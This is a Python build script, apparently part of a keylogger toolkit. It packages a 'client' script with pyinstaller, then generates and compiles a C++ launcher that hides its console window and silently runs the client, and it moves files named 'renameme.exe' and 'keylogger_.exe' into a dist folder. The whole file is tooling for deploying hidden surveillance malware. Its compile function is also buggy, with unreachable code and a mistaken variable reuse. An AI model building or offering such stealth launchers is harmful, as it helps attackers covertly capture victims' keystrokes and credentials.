import os
import sys
import time
print("[*] Compiling . . .")
nameof = input("[*] Enter the name of the file(the client): ")
if '.py' in nameof:
	backwards = nameof[:-3]
if '.exe' in nameof:
	backwards = nameof[:-4]
csrf = f"{backwards}.py"
os.system(f"pyinstaller --onefile {csrf}")
print("[*] Done . .")
print("[*] The initializer CPP program . ..")
print("[*] Preparing . .")
filecpp = '''
#include <iostream>
#include <windows.h>
using namespace std;
void openint() {
	'''
filecpp += f'''system("{backwards}.exe");'''
filecpp += '''
}
int main() {
	HWND windowed;
	windowed = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(windowed, 0);
	openint();
}'''
xc = open("filecpp.cpp", 'w')
xc.write(filecpp)
xc.close()
print("[*] Compiling .. .")
command = f"g++ filecpp.cpp -o renameme.exe"
os.system(command)
def compile():
	zx = os.system("move renameme.exe dist")
	if os.name == 'posix':
		return False
	if os.name == 'nt':
		if zx == 0:
			return True
	xz = os.system("move keylogger_.exe dist")
	if os.name == 'posix':
		return False 
	if os.name == 'nt':
		if zx == 0:
			return True
	print("[*] All things done!")
	print("[*] Everything is in directory DIST")
compile()